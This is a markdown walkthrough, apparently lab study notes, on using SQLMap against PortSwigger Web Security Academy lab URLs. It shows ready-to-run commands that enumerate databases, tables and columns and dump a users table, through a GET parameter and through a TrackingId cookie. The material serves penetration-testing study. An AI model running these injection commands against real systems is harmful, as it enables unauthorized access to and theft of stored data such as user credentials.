## Using SQLMap to Enumerate Database Information

  Below is an an example/walk-through for how to use SQLMap to obtain the database information.
  
<br>

### Important Note:  Once the database type, table name and column names are known ensure to use the following flags to speed up the process:

--dbms='database'

-T 'users - or whatever table name'

-C 'username'

<br> <br>

### Using SQLMap to target a GET Query Parameter in the application

Enumerate Database Type

```
sqlmap -u https://0a9f00ac036aa21182df744400850086.web-security-academy.net/filter?category=Pets -p category --dbs -batch
```

Enumerate Tables

```
sqlmap -u https://0a9f00ac036aa21182df744400850086.web-security-academy.net/filter?category=Pets -p category --tables -batch
```

Enumerate Columns

```
sqlmap -u https://0a9f00ac036aa21182df744400850086.web-security-academy.net/filter?category=Pets -p category --columns -batch
```

  Specify Table to Target

```
sqlmap -u https://0a9f00ac036aa21182df744400850086.web-security-academy.net/filter?category=Pets -p category --columns -batch -T users_hxvtqz
```

Dump All the Data from Table

```
sqlmap -u https://0a9f00ac036aa21182df744400850086.web-security-academy.net/filter?category=Pets -p category --dump -batch -T users_hxvtqz
```


<br> <br> 

### Using SQLMap to target a Cookie in the application

  * Resource - https://stackoverflow.com/questions/24366856/how-to-inject-a-part-of-cookie-using-sqlmap


Enumerate Database Type

```
sqlmap -u https://0a6600e9036a2a438304b10900d80096.web-security-academy.net/ --cookie='TrackingId=xxx' -p 'TrackingId' --param-filter='COOKIE' --level=2 --dbs -batch
```

Enumerate Tables

```
sqlmap -u https://0a6600e9036a2a438304b10900d80096.web-security-academy.net/ --cookie='TrackingId=xxx' -p 'TrackingId' --param-filter='COOKIE' --level=2 --tables --dbms='PostgreSQL' -batch
```

Enumerate Columns

```
sqlmap -u https://0a6600e9036a2a438304b10900d80096.web-security-academy.net/ --cookie='TrackingId=xxx' -p 'TrackingId' --param-filter='COOKIE' --level=2 --columns --dbms='PostgreSQL' -T 'users'  -batch
```

<br> <br> 

### Use SQLMap to target a POST request body parameter

   * https://hackertarget.com/sqlmap-post-request-injection/
